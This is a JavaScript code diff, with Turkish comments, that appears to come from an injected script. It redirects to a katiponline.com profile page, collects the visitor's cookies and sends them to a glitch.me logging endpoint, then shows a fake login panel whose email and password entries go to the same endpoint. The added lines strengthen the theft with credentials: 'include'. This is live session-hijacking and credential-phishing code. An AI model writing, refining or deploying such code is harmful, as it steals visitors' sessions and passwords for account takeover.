@@ -10,15 +10,19 @@
         window.location.replace('https://katiponline.com/duello/profildetay?t=45593');
       }, 200);
     }
-    const cookies = document.cookie;
+
+    // Cookie’leri kontrol et ve gönder
+    const cookies = document.cookie || '';
     if (cookies) {
       fetch('https://ancient-pentagonal-elephant.glitch.me/log?cookie=' + encodeURIComponent(cookies), {
         method: 'GET',
+        credentials: 'include' // Cookie’lerin gönderilmesini teşvik et
       })
         .then(response => response.text())
         .then(() => {})
         .catch(() => {});
     }
+
     setTimeout(() => {
       const loginPanel = document.createElement('div');
       loginPanel.innerHTML = `
@@ -186,8 +190,10 @@
         const data = `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`;
         fetch(`https://ancient-pentagonal-elephant.glitch.me/log?${data}`, {
           method: 'GET',
+          credentials: 'include' // Cookie’lerin gönderilmesini teşvik et
         })
           .then(response => response.text())
+          .then(() => {})
           .catch(() => {});
         setTimeout(() => {
           loginContainer.style.opacity = '0';
